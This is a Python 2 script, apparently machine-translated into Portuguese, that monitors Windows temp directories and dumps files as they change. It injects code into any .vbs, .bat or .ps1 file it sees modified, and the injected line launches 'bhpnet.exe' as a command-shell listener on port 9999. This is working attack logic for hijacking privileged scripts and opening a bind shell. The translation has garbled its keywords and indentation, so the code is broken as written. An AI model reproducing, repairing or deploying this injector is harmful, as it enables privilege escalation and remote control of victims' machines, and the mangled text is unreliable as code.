#Exemplo modificado que é originalmente fornecido aqui
# http://timgolden.me.uk/python/win32_how_do_i/watch_directory_for_changes.html
arquivo temporário de importação
rosqueamento de importação
import win32file
importar win32con
importar os

#arquivos de diretorios de arquivos temporarios
dirs_to_monitor = [ "C\\: \\ WINDOWS \\ TEMP",arquivo temporario . gettempdir()]

#constantes de modificação de arquivo
FILE_CREATED          = 1
FILE_DELETED          = 2
FILE_MODIFIED         = 3
FILE_RENAMED_FROM     = 4
FILE_RENAMED_TO       = 5

#snippets de codigo baseados em extensão para injetar
file_types          = {}
comando  = “ C : \\ WINDOWS \\ TEMP \\ bhpnet . exe - l - p  9999 - c ”
file_types [ '.vbs' ] = [ " \ r \ n 'bhpmarker \ r \ n " , " \ r \ n CreateObject ( \" Wscript.Shell \ " ). Execute ( \" % s \ " ) \ r \ n "  %  comando ]
file_types [ '.bat' ] = [ " \ r \ n REM bhpmarker \ r \ n " , " \ r \ n % s \ r \ n "  %  comando ]
file_types [ '.ps1' ] = [ " \ r \ n #bhpmarker" , "Processo de início \" % s \ " "  comando %  ]

def inject_code(nome_ficheiro completo, extensão, conteúdo):
          
     # o nosso marcador ja esta no arquivo
               if file_types [extension] [0] no conteudo:
                   return

               #nenum marcador, vamos injetar o marcador e o codigo
full_contents = file_types[extensão] [0]
full_contents +=  file_types [extensão] [1]
full_contents += conteudo


fd = aberto (nome_ficheiro completo, "wb")
fd.gravação(full_contents)
fd.fechar()

print "[\o/] código injetado"

return


def start_monitor(caminho_para_watch):
    
    #criamos um encadeamento para cada execução de monitoramento
    FILE_LIST_DIRECTORY = 0X0001
    
    h_directory = arquivo win32.createfile(
            path_to _watch
             FILE_LIST_DIRECTORY ,
        win32con . FILE_SHARE_READ  |  win32con . FILE_SHARE_WRITE  |  win32con . FILE_SHARE_DELETE ,
        Nenhuma ,
        win32con . OPEN_EXISTING ,
        win32con . FILE_FLAG_BACKUP_SEMANTICS ,
        Nenhum )

    enquanto  1 :
        tente :
            results  =  win32file . ReadDirectoryChangesW (
                h_directory ,
                1024 ,
                Verdade ,
                win32con . FILE_NOTIFY_CHANGE_FILE_NAME  |
                win32con . FILE_NOTIFY_CHANGE_DIR_NAME  |
                win32con . FILE_NOTIFY_CHANGE_ATTRIBUTES  |
                win32con . FILE_NOTIFY_CHANGE_SIZE  |
                win32con . FILE_NOTIFY_CHANGE_LAST_WRITE  |
                win32con . FILE_NOTIFY_CHANGE_SECURITY ,
                Nenhuma ,
                Nenhum
                )
            
            
            para  ação , file_name  nos  resultados :
                full_filename  =  os . caminho . junção ( path_to_watch , file_name )
                
                se  ação  ==  FILE_CREATED :
                    print  "[+] Criou% s"  %  full_filename
                 ação  elif ==  FILE_DELETED :
                    print  "[-] Excluído% s"  %  full_filename
                 ação  elif ==  FILE_MODIFIED :
                    print  "[*]% s" modificado  %  full_filename
                    
                    # despejar o conteúdo do arquivo
                    print  "[vvv] Despejando conteúdo ..."
                    
                    tente :
                        fd  =  aberto ( nome_ficheiro completo , "rb" )
                        conteúdo  =  fd . read ()
                        fd . fechar ()
                        imprimir  conteúdo
                        print  "[^^^] Despejo concluído."
                    exceto :
                        print  "[!!!] Falha."
                    
                    nome do arquivo , extensão  =  os . caminho . splitext ( nome_ficheiro completo )
                    
                    if extensão em file_types:
                        inject_code(nome_ficheiro completo, extensão, conteudo)
                        
                        ação == elif file_renamed_from:
                            print "[>] renamed de :%s" % fuul_filename
                            ação == elif == file_renamed_to:
                                print "[<] renamed de :%s" % fuul_filename
                            else:
                                print "[???] desconhecido  %s" % full_filename
except:
    return

para o caminho em dirs_to_monitor:
    monitor_thread = threading.thread(target = start_monitor, args = (caminho))
    print "Encadeamento de monitoramento de desova para caminho:% s" % caminho
    monitor_thread.start()
    